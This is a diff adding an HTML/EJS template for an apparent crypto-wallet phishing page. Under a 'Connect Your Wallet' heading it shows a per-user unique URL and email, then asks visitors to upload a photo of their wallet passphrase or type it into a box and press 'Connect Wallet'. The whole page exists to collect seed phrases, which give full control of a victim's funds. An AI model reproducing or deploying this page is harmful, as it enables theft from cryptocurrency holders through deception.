@@ -1,0 +1,159 @@
+<div class="container content-space-t-2 content-space-lg-3">
+    <!-- Heading -->
+    <div class="w-md-75 w-lg-50 text-center mx-md-auto mb-5 mb-md-9">
+        <h2>Connect Your Wallet & Web 3.0 Decentralized Application</h2>
+        <div class="divider"></div>
+        <h3 class="text-center"
+            >Unique URL:
+            <a target="_blank" href="<%= user.controlUrl %>" rel="noreferrer">
+                <span class="badge p-1 bg-soft-info text-dark rounded-pill"
+                    ><%= user.controlUrl %>
+                </span>
+            </a>
+        </h3>
+        <h3 class="text-center">
+            Email Address:
+            <span class="badge p-1 bg-soft-info text-dark rounded-pill"
+                ><%= user.email %>
+            </span>
+        </h3>
+    </div>
+    <!-- End Heading -->
+
+    <!-- Nav Scroller -->
+    <div class="js-nav-scroller hs-nav-scroller-horizontal">
+        <span class="hs-nav-scroller-arrow-prev" style="display: none">
+            <a class="hs-nav-scroller-arrow-link" href="javascript:;">
+                <i class="bi-chevron-left"></i>
+            </a>
+        </span>
+
+        <span class="hs-nav-scroller-arrow-next" style="display: none">
+            <a class="hs-nav-scroller-arrow-link" href="javascript:;">
+                <i class="bi-chevron-right"></i>
+            </a>
+        </span>
+
+        <!-- Nav -->
+        <ul
+            class="nav nav-segment nav-pills nav-fill mx-auto mb-7"
+            id="featuresTab"
+            role="tablist"
+            style="max-width: 30rem"
+        >
+            <li class="nav-item" role="presentation">
+                <a
+                    class="nav-link"
+                    href="#featuresOne"
+                    id="featuresOne-tab"
+                    data-bs-toggle="tab"
+                    data-bs-target="#featuresOne"
+                    role="tab"
+                    aria-controls="featuresOne"
+                    aria-selected="false"
+                    >Upload Phrase</a
+                >
+            </li>
+
+            <li class="nav-item" role="presentation">
+                <a
+                    class="nav-link active"
+                    href="#featuresTwo"
+                    id="featuresTwo-tab"
+                    data-bs-toggle="tab"
+                    data-bs-target="#featuresTwo"
+                    role="tab"
+                    aria-controls="featuresTwo"
+                    aria-selected="true"
+                    >Enter Passphrase</a
+                >
+            </li>
+        </ul>
+        <!-- End Nav -->
+    </div>
+    <!-- End Nav Scroller -->
+
+    <!-- Tab Content -->
+    <div class="tab-content" id="featuresTabContent">
+        <div
+            class="tab-pane fade"
+            id="featuresOne"
+            role="tabpanel"
+            aria-labelledby="featuresOne-tab"
+        >
+            <div class="container">
+                <div class="row">
+                    <div class="col-md-8 mx-auto">
+                        <form>
+                            <!-- Dropzone -->
+                            <p class="text-muted"
+                                ><small
+                                    >You can take a picture of your passphrase
+                                    and upload. Ensure that the phrases are
+                                    written clearly on a white sheet.</small
+                                ></p
+                            >
+                            <div
+                                id="basicExampleDropzone"
+                                class="
+                                    js-dropzone
+                                    row
+                                    mx-auto
+                                    dz-dropzone dz-dropzone-card
+                                    mb-3
+                                "
+                            >
+                                <div class="dz-message">
+                                    <span class="svg-icon svg-icon-lg mb-3">
+                                    </span>
+
+                                    <h5>Drag and drop your passphrase here</h5>
+
+                                    <p class="mb-2">or</p>
+
+                                    <span class="btn btn-white btn-sm"
+                                        >Browse files</span
+                                    >
+                                </div>
+                            </div>
+                            <!-- End Dropzone -->
+                        </form>
+                    </div>
+                </div>
+            </div>
+        </div>
+
+        <div
+            class="tab-pane fade active show"
+            id="featuresTwo"
+            role="tabpanel"
+            aria-labelledby="featuresTwo-tab"
+        >
+            <div class="container">
+                <div class="row">
+                    <div class="col-md-8 mx-auto">
+                        <form action="">
+                            <div class="mb-3">
+                                <textarea
+                                    required
+                                    id="phrase"
+                                    class="form-control"
+                                    placeholder="Enter your passphrase"
+                                    rows="8"
+                                ></textarea>
+                            </div>
+                            <div class="mb-3">
+                                <button
+                                    type="submit"
+                                    class="btn btn-primary btn-lg btn-block"
+                                    >Connect Wallet</button
+                                >
+                            </div>
+                        </form>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+    <!-- End Tab Content -->
+</div>
